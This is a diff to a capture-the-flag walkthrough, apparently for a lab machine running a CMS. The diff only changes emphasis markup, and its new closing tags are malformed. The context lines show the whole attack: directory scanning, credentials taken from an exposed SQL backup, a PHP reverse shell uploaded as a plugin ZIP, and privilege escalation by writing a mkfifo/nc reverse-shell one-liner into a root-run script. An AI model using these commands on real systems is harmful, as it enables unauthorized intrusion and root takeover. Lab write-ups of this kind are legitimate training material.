@@ -25,13 +25,13 @@ I used:
 
 `feroxbuster -u http://10.114.130.176/`
 
-This revealed the following interesting *** paths ***:
+This revealed the following interesting <em><strong>paths</strong><em>:
 
 <http://10.114.130.176/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql>
 
 <http://10.114.130.176/content/as/>
 
-In the first link, I found a username: *** manager *** and a hash:
+In the first link, I found a username: <em><strong>manager</strong><em> and a hash:
 
 `42f749ade7f9e195bf475f37a44cafcb:Password123`
 
@@ -49,13 +49,13 @@ using those credentials.
 
 <h4>Gaining a Shell</h4>
 
-Inside the platform, any *** media center or plugin *** is likely to be vulnerable.
+Inside the platform, any <em><strong>media center or plugin</strong><em> is likely to be vulnerable.
 
 First, I opened a listener:
 
 `nc -lvnp 4444`
 
-Then, I uploaded a  ***reverse shell *** as a *** ZIP  ***file and accessed the uploaded file to trigger it.
+Then, I uploaded a  <em><strong>reverse shell</strong><em> as a <em><strong>ZIP</strong><em> file and accessed the uploaded file to trigger it.
 
 Reverse shell used:
 <https://github.com/Arrexel/phpbash/blob/master/phpbash.php>
@@ -66,11 +66,11 @@ The exploit worked, and I obtained a shell.
 
 Inside /home/itguy, I found the `user.txt` file.
 
-I also noticed a script called *** backup.pl *** that uses `/etc/copy.sh`.
+I also noticed a script called <em><strong>backup.pl</strong><em> that uses `/etc/copy.sh`.
 
 <h4>Privilege Escalation</h4>
 
-Since *** backup.pl  ***executes  ***/etc/copy.sh ***, I modified copy.sh to include a reverse shell:
+Since <em><strong>backup.pl</strong><em> executes  <em><strong>/etc/copy.sh</strong><em>, I modified copy.sh to include a reverse shell:
 
 `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <yourip> 4443 > /tmp/f" > /etc/copy.sh`
 
